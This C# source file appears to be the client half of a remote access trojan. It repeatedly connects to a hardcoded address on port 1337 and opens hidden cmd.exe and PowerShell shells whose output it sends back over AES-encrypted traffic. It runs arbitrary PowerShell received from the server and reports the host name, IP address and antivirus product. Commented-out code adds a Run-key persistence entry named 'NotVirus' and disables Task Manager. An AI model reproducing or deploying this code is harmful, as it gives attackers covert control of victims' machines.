using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.IO;
using System.Threading;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management;
using System.Net.NetworkInformation;
using Microsoft.Win32;
using static System.Net.Mime.MediaTypeNames;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Management.Automation.Host;
using System.Drawing;
using System.Diagnostics;

namespace SISClient
{
    class Program
    {
        private static readonly Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private const int _PORT = 1337;
        private static StreamReader fromShell;
        private static StreamWriter toShell;
        private static StreamReader eror;

        static void Main(string[] args)
         {
            //ToggleTaskManager(true);
            //RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //reg.SetValue("NotVirus", Assembly.GetExecutingAssembly().Location);
            ConnectToServer();
            RequestLoop();
         }

        //public static void ToggleTaskManager(bool toggle)
        //{
        //    Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.LocalMachine;
        //    Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
        //    key.SetValue("DisableTaskMgr", toggle ? 0 : 1, Microsoft.Win32.RegistryValueKind.DWord);
        //}

        private static void ConnectToServer()
        {
            int attempts = 0;
            while (!_clientSocket.Connected)
            {
                try
                {
                    attempts++;
                    Console.WriteLine("Connection attempt " + attempts);
                    _clientSocket.Connect(IPAddress.Parse("192.168.42.1"), _PORT);
                }
                catch
                {
                    Console.Clear();
                }
            }
            Console.Clear();
            Console.WriteLine("Connected");
        }

        private static void RequestLoop()
        {
            Console.WriteLine(@"<Type ""Exit"" to properly disconnect client>");
            while(true)
            {
                ReceiveResponse();
            }
        }

        private static bool cmdT = false;
        private static bool powershellT = false;

        private static void ReceiveResponse()
        {
            try
            {
                var buffer = new byte[2048];
                int received = _clientSocket.Receive(buffer, SocketFlags.None);
                if (received == 0) return;
                var data = new byte[received];
                Array.Copy(buffer, data, received);
                string text = Encoding.Unicode.GetString(data);
                text = Decrypt(text);
                Console.WriteLine(text);
                if (text == "control") sendCommand("OK");
                if (text.StartsWith("systeminfo-"))
                {
                    int id = int.Parse(text.Split('-')[1]);
                    string info = Environment.MachineName + "€" + GetIPAddress() + "€" + antivirusName();
                    string responde = "systeminfo;" + id.ToString() + ";" + info;
                    sendCommand(responde);
                }
                
                if (text == "startpowershell")
                {
                    ProcessStartInfo info = new ProcessStartInfo();
                    info.FileName = "powershell.exe";
                    info.CreateNoWindow = true;
                    info.UseShellExecute = false;
                    info.RedirectStandardInput = true;
                    info.RedirectStandardOutput = true;
                    info.RedirectStandardError = true;

                    Process p = new Process();
                    p.StartInfo = info;
                    p.Start();
                    toShell = p.StandardInput;
                    fromShell = p.StandardOutput;
                    eror = p.StandardError;
                    toShell.AutoFlush = true;

                    Thread shellThread = new Thread(new ThreadStart(getShellInput));
                    shellThread.Start();
                }

                if (text == "startcmd")
                {
                    ProcessStartInfo info = new ProcessStartInfo();
                    info.FileName = "cmd.exe";
                    info.CreateNoWindow = true;
                    info.UseShellExecute = false;
                    info.RedirectStandardInput = true;
                    info.RedirectStandardOutput = true;
                    info.RedirectStandardError = true;

                    Process p = new Process();
                    p.StartInfo = info;
                    p.Start();
                    toShell = p.StandardInput;
                    fromShell = p.StandardOutput;
                    eror = p.StandardError;
                    toShell.AutoFlush = true;

                    Thread shellThread = new Thread(new ThreadStart(getShellInput));
                    shellThread.Start();

                }

                if (text.StartsWith("cmd"))
                {
                    string command = text.Split('§')[1];
                    toShell.WriteLine(command + "\r\n");
                }

                if (text.StartsWith("powershell"))
                {
                    string command = text.Split('§')[1];
                    toShell.WriteLine(command + "\r\n");
                }

                if (text != "control" && text != "systeminfo-" && !text.StartsWith("cmd") && !text.StartsWith("powershell"))
                {
                        try
                        {
                            using (PowerShell PowerShellInstance = PowerShell.Create())
                            {
                                foreach (string t in text.Split(';'))
                                {
                                    PowerShellInstance.AddScript(t);
                                    IAsyncResult result = PowerShellInstance.BeginInvoke();
                                    while (result.IsCompleted == false)
                                    {
                                        Console.WriteLine("Waiting for pipeline to finish...");
                                        Thread.Sleep(1000);
                                    }
                                    Console.WriteLine("Finished!");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            sendCommand(ex.Message);
                        }
                }
            }
            catch
            {
            }
        }

        private static void getShellInput()
        {
            try
            {
                string tempBuf = "";
                string tempError = "";
                string edata = "";
                string sdata = "";
                while ((tempBuf = fromShell.ReadLine()) != null)
                {
                    sdata = sdata + tempBuf + "\r";
                    sdata = sdata.Replace("cmdout", String.Empty);
                    sendCommand("cmdout§" + sdata);
                    sdata = "";
                }

                while ((tempError = eror.ReadLine()) != null)
                {
                    edata = edata + tempError + "\r";
                    sendCommand("cmdout§" + edata);
                    edata = "";
                }

            }
            catch (Exception ex)
            {
                sendCommand("cmdout§Error reading cmd response: \n" + ex.Message);
            }
        }

        public static string antivirusName()
        {
            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
            var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
            var instances = searcher.Get();
            string av = "";
            foreach (var instance in instances)
            {
                av = instance.GetPropertyValue("displayName").ToString();
            }
            if (av == "") av = "N/A";
            return av;
        }

        public static string GetIPAddress()
        {
            var address = NetworkInterface
            .GetAllNetworkInterfaces()
            .Where(i => i.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
            .SelectMany(i => i.GetIPProperties().UnicastAddresses)
            .Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork)
            .Select(a => a.Address.ToString())
            .ToList();

            foreach (var a in address)
            {
                if (a != null) return a.ToString();
            }
            return "N/A";
        }

        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "SOMERANDKEY9189231215";
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return clearText;
            }
        }

        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "SOMERANDKEY9189231215";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Cipher Text: " + cipherText);
                return "error";
            }
        }

        private static void sendCommand(String command)
        {
            String k = command;
            String crypted = Encrypt(k);
            byte[] data = System.Text.Encoding.Unicode.GetBytes(crypted);
            _clientSocket.Send(data);
        }
    }
}
